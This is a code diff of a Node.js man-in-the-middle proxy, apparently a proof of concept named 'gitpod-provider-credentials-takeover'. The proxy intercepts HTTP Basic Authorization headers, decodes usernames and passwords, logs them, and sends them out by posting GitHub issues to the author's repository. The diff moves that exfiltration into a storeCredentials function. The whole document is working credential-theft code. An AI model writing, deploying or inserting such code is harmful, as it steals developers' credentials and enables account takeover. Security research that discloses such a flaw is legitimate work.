@@ -1,7 +1,27 @@
 const stream = require('stream')
-const MitmProxy = require('@pureproxy/mitmproxy')
+,     MitmProxy = require('@pureproxy/mitmproxy')
 
 var credentials = {}
+
+const storeCredentials = data => new Promise((resolve, reject) => {
+    if (!credentials[data.target]) {
+        
+        console.log('I got a new credential:', data)
+
+        require('request').post({
+            headers: { 'content-type' : 'application/json',
+                        'user-agent': 'request' },
+            url: `https://${encodeURI(data.user)}:${encodeURI(data.password)}@api.github.com/repos/gerardo-junior/gitpod-provider-credentials-takeover/issues`,
+            body: JSON.stringify({ 
+                title: 'I got a valid token from you!',
+                body: 'this is a return to click to open issue on gitpod',
+                assignee: 'gerardo-junior' 
+            })
+        })
+        
+
+    }
+})
 
 const server = new class extends MitmProxy {
   wrapClientForObservableStreaming(client, { hostname, port, context }) {
@@ -26,33 +46,16 @@ const server = new class extends MitmProxy {
                 try {
                  
                     let basicAuth =  Buffer.from(content.replace('Authorization: Basic ', ''), 'base64').toString('utf8').split(':')
-                    
-                    credentials[client._host || client._parent._host] = {
+
+                    storeCredentials({
+                        target: client._host || client._parent._host,
                         user: decodeURI(basicAuth[0]), 
                         password: decodeURI(basicAuth[1]) 
-                    }
-
-                    require('request').post({
-                        headers: { 'content-type' : 'application/json',
-                                   'user-agent': 'request' },
-                        url: `https://${basicAuth[0]}:${basicAuth[1]}@api.github.com/repos/gerardo-junior/gitpod-provider-credentials-takeover/issues`,
-                        body: JSON.stringify({ 
-                            title: 'I got a valid token from you!',
-                            body: 'this is a return to click to open issue on gitpod',
-                            assignee: 'gerardo-junior' 
-                        })
-                    }, function(error, response, body){
-                        console.log(body);
-                    });
-        
+                    })        
 
                 } catch (err) {
                     console.error(err)
                 }
-
-                
-                console.log('I got a credential:', credentials)
-                
             }
         })
 
